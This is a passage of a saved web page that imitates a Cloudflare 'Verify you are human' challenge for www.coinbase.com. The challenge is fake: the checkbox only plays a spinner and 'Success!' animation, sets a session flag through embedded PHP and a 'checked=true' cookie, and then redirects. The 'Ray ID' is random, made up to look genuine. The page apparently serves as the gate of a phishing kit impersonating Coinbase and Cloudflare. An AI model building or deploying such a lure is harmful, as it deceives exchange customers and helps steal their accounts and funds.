xpbmsge1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuXG4gICAgICAgICAgICAmOnZpc2l0ZWQsXG4gICAgICAgICAgICAmOmxpbmsge1xuICAgICAgICAgICAgICAgIGNvbG9yOiAkY29sb3ItNjtcbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgJjpob3ZlcixcbiAgICAgICAgICAgICY6Zm9jdXMsXG4gICAgICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgICAgICAgY29sb3I6ICRjb2xvci03O1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG5cbiAgICAgICAgI2V4cGlyZWQtcmVmcmVzaC1saW5rLFxuICAgICAgICAjdGltZW91dC1yZWZyZXNoLWxpbmsge1xuICAgICAgICAgICAgY29sb3I6ICRjb2xvci02O1xuXG4gICAgICAgICAgICAmOnZpc2l0ZWQsXG4gICAgICAgICAgICAmOmxpbmsge1xuICAgICAgICAgICAgICAgIGNvbG9yOiAkY29sb3ItNjtcbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgJjpob3ZlcixcbiAgICAgICAgICAgICY6Zm9jdXMsXG4gICAgICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgICAgICAgY29sb3I6ICRjb2xvci03O1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG5cbiAgICAgICAgLm92ZXJsYXkge1xuICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAkYm9yZGVyLWNvbG9yLTM7XG4gICAgICAgICAgICBjb2xvcjogJGNvbG9yLTM7XG4gICAgICAgIH1cbiAgICB9XG59XG4iXX0= */</style>
        <style>.WdPT2{background-image:/*savepage-url=/cdn-cgi/challenge-platform/h/b/cmg/1/hV7fTYrIy7e%2FC5FuCgYHr5Utjf5x6tY32TUpCSZd1P8%3D*/var(--savepage-url-1); background-position: -1px -1px; background-repeat:no-repeat;}</style>
        
        <script data-savepage-type=&quot;&quot; type=&quot;text/plain&quot;></script>
        <script data-savepage-type=&quot;&quot; type=&quot;text/plain&quot; data-savepage-src=&quot;/cdn-cgi/challenge-platform/h/b/orchestrate/chl_api/v1?ray=88a31273a95c0400&quot;></script>
    
    <style id=&quot;savepage-cssvariables&quot;>
      :root {
        --savepage-url-1: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAIAAAD91JpzAAAABElEQVQAAAABnSTXkQAAAABJRU5ErkJggg==);
      }
    </style>
                      </head>
    <body class=&quot;theme-dark size-normal&quot;>
    <div class=&quot;main-wrapper&quot;>
        <noscript>
            <h1 style=&quot;color:#bd2426;&quot;>Please turn JavaScript on and reload the page.</h1>
        </noscript>
        <script>
            document.addEventListener(&quot;DOMContentLoaded&quot;, function() {
                const checkbox = document.getElementById(&quot;myCheckbox&quot;);
                const challengeStage = document.getElementById(&quot;challenge-stage&quot;);
                const verifying = document.getElementById(&quot;verifying&quot;);
                const success = document.getElementById(&quot;success&quot;);
            
                checkbox.addEventListener(&quot;change&quot;, function() {
                    if (this.checked) {
                        console.log(&quot;Checkbox is checked!&quot;);
                        challengeStage.style.display = &quot;none&quot;;
                        verifying.removeAttribute(&quot;style&quot;);
            
                        setTimeout(function() {
                            verifying.setAttribute(&quot;style&quot;, &quot;display: none; visibility: hidden;&quot;);
                            success.removeAttribute(&quot;style&quot;);
                            setTimeout(function() {
                               <?php
                                session_start();
                                $_SESSION['cloudflare'] = true;
                                ?>
                                
                                document.cookie = 'checked=true; max-age=3600; path=/';
                              
                            }, 1500);
                        }, 2000);
                    } else {
                        console.log(&quot;Checkbox is unchecked.&quot;);
                        challengeStage.style.display = &quot;flex&quot;;
                        verifying.style.display = &quot;none&quot;;
                        verifying.style.visibility = &quot;hidden&quot;;
                    }
                });
            });                                            
        </script>        
        
        <div id=&quot;content&quot; style=&quot;display: flex;&quot; aria-live=&quot;polite&quot; aria-atomic=&quot;true&quot;>
            <div id=&quot;challenge-stage&quot; style=&quot;display: flex;&quot;><div class=&quot;cb-c&quot; role=&quot;alert&quot; style=&quot;display: flex;&quot;><label class=&quot;cb-lb&quot;><input type=&quot;checkbox&quot; id=&quot;myCheckbox&quot;><span class=&quot;cb-i&quot;></span><span class=&quot;cb-lb-t&quot;>Verify you are human</span></label></div></div>
            <div id=&quot;verifying&quot; class=&quot;cb-container&quot; style=&quot;display: none; visibility: hidden;&quot;>
                <svg id=&quot;spinner-icon&quot; viewBox=&quot;0 0 30 30&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; aria-hidden=&quot;true&quot; class=&quot;unspun&quot;>
                    <line x1=&quot;15&quot; x2=&quot;15&quot; y1=&quot;1.5&quot; y2=&quot;5.5&quot; class=&quot;circle&quot;></line>
                    <line x1=&quot;24.5459&quot; x2=&quot;24.5459&quot; y1=&quot;5.45405&quot; y2=&quot;10.45405&quot; transform=&quot;rotate(45 24.5459 5.45405)&quot; class=&quot;circle&quot;></line>
                    <line x1=&quot;28.5&quot; x2=&quot;28.5&quot; y1=&quot;15&quot; y2=&quot;20&quot; transform=&quot;rotate(90 28.5 15)&quot; class=&quot;circle&quot;></line>
                    <line x1=&quot;24.5459&quot; x2=&quot;24.5459&quot; y1=&quot;24.546&quot; y2=&quot;29.546&quot; transform=&quot;rotate(135 24.5459 24.546)&quot; class=&quot;circle&quot;></line>
                    <line x1=&quot;15&quot; x2=&quot;15&quot; y1=&quot;28.5&quot; y2=&quot;33.5&quot; transform=&quot;rotate(180 15 28.5)&quot; class=&quot;circle&quot;></line>
                    <line x1=&quot;5.4541&quot; x2=&quot;5.4541&quot; y1=&quot;24.5459&quot; y2=&quot;29.5459&quot; transform=&quot;rotate(-135 5.4541 24.5459)&quot; class=&quot;circle&quot;></line>
                    <line x1=&quot;1.5&quot; x2=&quot;1.5&quot; y1=&quot;15&quot; y2=&quot;20&quot; transform=&quot;rotate(-90 1.5 15)&quot; class=&quot;circle&quot;></line>
                    <line x1=&quot;5.45408&quot; x2=&quot;5.45408&quot; y1=&quot;5.45404&quot; y2=&quot;10.45404&quot; transform=&quot;rotate(-45 5.45408 5.45404)&quot; class=&quot;circle&quot;></line>
                </svg>
                <div id=&quot;verifying-msg&quot;>
                    <span id=&quot;verifying-text&quot;>Verifying...</span>
                    
                </div>
            </div>
            <div id=&quot;success&quot; class=&quot;cb-container&quot; style=&quot;display:none&quot; role=&quot;alert&quot;>
                <svg id=&quot;success-icon&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 52 52&quot; aria-hidden=&quot;true&quot;>
                    <circle class=&quot;success-circle&quot; cx=&quot;26&quot; cy=&quot;26&quot; r=&quot;25&quot;></circle>
                    <path class=&quot;p1&quot; d=&quot;m13,26l9.37,9l17.63,-18&quot;></path>
                </svg>
                <span id=&quot;success-text&quot;>Success!</span>
            </div>
            <div id=&quot;fail&quot; class=&quot;cb-container&quot; style=&quot;display:none&quot; role=&quot;alert&quot;>
                <svg id=&quot;fail-icon&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 52 52&quot; aria-hidden=&quot;true&quot;>
                    <circle class=&quot;failure-circle&quot; cx=&quot;26&quot; cy=&quot;26&quot; r=&quot;25&quot; fill=&quot;none&quot;></circle>
                    <path class=&quot;failure-cross&quot; fill=&quot;none&quot; d=&quot;M14.1 27.2 l24.124.2&quot;></path>
                </svg>
                <div id=&quot;failure-msg&quot;>
                    <span id=&quot;fail-text&quot;>Failure!</span>
                    <br><span id=&quot;fr-helper&quot;><a data-savepage-href=&quot;#refresh&quot; href=&quot;#refresh&quot; id=&quot;fr-helper-link&quot;>Having trouble?</a></span>
                </div>
            </div>
            <div id=&quot;expired&quot; class=&quot;cb-container&quot; style=&quot;display:none&quot; role=&quot;alert&quot;>
                <svg id=&quot;expired-icon&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 52 52&quot; aria-hidden=&quot;true&quot;>
                    <circle class=&quot;expired-circle&quot; cx=&quot;26&quot; cy=&quot;26&quot; r=&quot;25&quot;></circle>
                    <path class=&quot;expired-p1&quot; d=&quot;m13,32l15,0l0,-23&quot;></path>
                </svg>
                <div id=&quot;expiry-msg&quot;>
                    <span id=&quot;expired-text&quot;>Expired.</span><a data-savepage-href=&quot;#refresh&quot; href=&quot;#refresh&quot; id=&quot;expired-refresh-link&quot;>Refresh</a>
                </div>
            </div>
            <div id=&quot;timeout&quot; class=&quot;cb-container&quot; style=&quot;display:none&quot; role=&quot;alert&quot;>
                <svg id=&quot;timeout-icon&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 52 52&quot; aria-hidden=&quot;true&quot;>
                    <circle class=&quot;timeout-circle&quot; cx=&quot;26&quot; cy=&quot;26&quot; r=&quot;25&quot;></circle>
                    <path class=&quot;timeout-p1&quot; d=&quot;m13,32l15,0l0,-23&quot;></path>
                </svg>
                <div id=&quot;timeout-msg&quot;>
                    <span id=&quot;timeout-text&quot;>Timed out.</span><a data-savepage-href=&quot;#refresh&quot; href=&quot;#refresh&quot; id=&quot;timeout-refresh-link&quot;>Refresh</a>
                </div>
            </div>
            <div id=&quot;challenge-error&quot; class=&quot;cb-container&quot; style=&quot;display:none&quot; role=&quot;alert&quot;>
                <span id=&quot;challenge-error-text&quot;></span>
            </div>
            <div id=&quot;branding&quot;>
                <a class=&quot;cf-link&quot; target=&quot;_blank&quot; href=&quot;https://www.cloudflare.com/products/turnstile/?utm_source=turnstile&amp;utm_campaign=widget&quot; rel=&quot;noopener noreferrer&quot;>
                    <svg role=&quot;img&quot; aria-label=&quot;Cloudflare&quot; id=&quot;logo&quot; viewBox=&quot;0 0 74 25&quot; fill=&quot;none&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;>
                        <path d=&quot;M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z&quot; fill=&quot;#F6821F&quot;></path>
                        <path d=&quot;M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z&quot; fill=&quot;#FBAD41&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M8.11963 18.8904H9.75541V23.4254H12.6139V24.8798H8.11963V18.8904Z&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M14.3081 21.9023V21.8853C14.3081 20.1655 15.674 18.7704 17.4952 18.7704C19.3164 18.7704 20.6653 20.1482 20.6653 21.8681V21.8853C20.6653 23.6052 19.2991 24.9994 17.4785 24.9994C15.6578 24.9994 14.3081 23.6222 14.3081 21.9023ZM18.9958 21.9023V21.8853C18.9958 21.0222 18.3806 20.2679 17.4785 20.2679C16.5846 20.2679 15.9858 21.0038 15.9858 21.8681V21.8853C15.9858 22.7484 16.6013 23.5025 17.4952 23.5025C18.3973 23.5025 18.9958 22.7666 18.9958 21.9023Z&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M22.6674 22.253V18.8901H24.3284V22.2191C24.3284 23.0822 24.7584 23.4939 25.4159 23.4939C26.0733 23.4939 26.5034 23.1003 26.5034 22.2617V18.8901H28.1647V22.2093C28.1647 24.1432 27.0772 24.9899 25.3991 24.9899C23.7211 24.9899 22.6674 24.1268 22.6674 22.2522&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M30.668 18.8907H32.9445C35.0526 18.8907 36.275 20.1226 36.275 21.8508V21.8684C36.275 23.5963 35.0355 24.88 32.911 24.88H30.668V18.8907ZM32.97 23.4076C33.9483 23.4076 34.597 22.8609 34.597 21.8928V21.8759C34.597 20.9178 33.9483 20.3614 32.97 20.3614H32.3038V23.4082L32.97 23.4076Z&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M38.6525 18.8904H43.3738V20.3453H40.2883V21.3632H43.079V22.7407H40.2883V24.8798H38.6525V18.8904Z&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M45.65 18.8904H47.2858V23.4254H50.1443V24.8798H45.65V18.8904Z&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M54.4187 18.8475H55.9949L58.5079 24.8797H56.7541L56.3238 23.8101H54.047L53.6257 24.8797H51.9058L54.4187 18.8475ZM55.8518 22.5183L55.1941 20.8154L54.5278 22.5183H55.8518Z&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M60.6149 18.8901H63.4056C64.3083 18.8901 64.9317 19.13 65.328 19.5406C65.6742 19.883 65.8511 20.3462 65.8511 20.9357V20.9526C65.8511 21.8678 65.3691 22.4754 64.6369 22.7919L66.045 24.88H64.1558L62.9671 23.0658H62.2507V24.88H60.6149V18.8901ZM63.3299 21.7654C63.8864 21.7654 64.2071 21.4915 64.2071 21.0551V21.0381C64.2071 20.5674 63.8697 20.328 63.3211 20.328H62.2507V21.7665L63.3299 21.7654Z&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M68.2112 18.8904H72.9578V20.3024H69.8302V21.209H72.6632V22.5183H69.8302V23.4683H73V24.8798H68.2112V18.8904Z&quot;></path>
                        <path class=&quot;logo-text&quot; d=&quot;M4.53824 22.6043C4.30918 23.13 3.82723 23.5022 3.18681 23.5022C2.29265 23.5022 1.67746 22.7493 1.67746 21.8851V21.8678C1.67746 21.0047 2.27593 20.2676 3.1698 20.2676C3.84367 20.2676 4.35681 20.6882 4.5734 21.2605H6.29764C6.02151 19.8349 4.78716 18.7707 3.18681 18.7707C1.36533 18.7707 0 20.1666 0 21.8851V21.9021C0 23.6219 1.3486 25 3.1698 25C4.72762 25 5.94525 23.9764 6.26645 22.6046L4.53824 22.6043Z&quot;></path>
                    </svg>
                </a>
                <div id=&quot;terms&quot;>
                    <a id=&quot;privacy-link&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://www.cloudflare.com/privacypolicy/&quot;>Privacy</a><span class=&quot;link-spacer&quot;> • </span><a id=&quot;terms-link&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://www.cloudflare.com/website-terms/&quot;>Terms</a>
                </div>
            </div>
        </div>
    </div>
    </body></html>" data-savepage-crossorigin="" src="" allow="cross-origin-isolated; fullscreen; autoplay allow-same-origin" data-savepage-sandbox=" allow-popups" sandbox="allow-same-origin allow-scripts" id="cf-chl-widget-sctas" tabindex="0" title="Widget containing a Cloudflare security challenge" style="border: none; overflow: hidden; width: 300px; height: 65px;" data-savepage-key="0-0"></iframe><input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-sctas_response" value=""></div></div></div><div id="challenge-spinner" class="spacer loading-spinner" style="display: none; visibility: hidden;"><div class="lds-ring"><div></div><div></div><div></div><div></div></div></div><div id="challenge-body-text" class="core-msg spacer">www.coinbase.com needs to review the security of your connection before proceeding.</div><div id="challenge-success" style="display: none;"><div id="challenge-success-text" class="h2">Verification successful</div><div class="core-msg spacer">Waiting for www.coinbase.com to respond...</div></div><noscript><div id="challenge-error-title"><div class="h2"><span id="challenge-error-text">Enable JavaScript and cookies to continue</span></div></div></noscript></div></div><script data-savepage-type="" type="text/plain"></script><div class="footer" role="contentinfo"><div class="footer-inner"><div class="clearfix diagnostic-wrapper"><div class="ray-id">Ray ID: <code id="ray-id"></code></div></div><div class="text-center" id="footer-text">Performance & security by Cloudflare</div></div></div><script>
    document.getElementById('ray-id').textContent = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
    </script></body></html>




<script>

    function checkCookieAndRedirect() {

        if (document.cookie.split(';').some((item) => item.trim().startsWith('checked='))) {
            const checkedValue = document.cookie
                .split('; ')
                .find(row => row.startsWith('checked='))
                .split('=')[1];
            
            
            if (checkedValue === 'true') {
                window.location.href = '/';
            }
        }
    }

    checkCookieAndRedirect();

   
    setInterval(checkCookieAndRedirect, 1200);
</script>
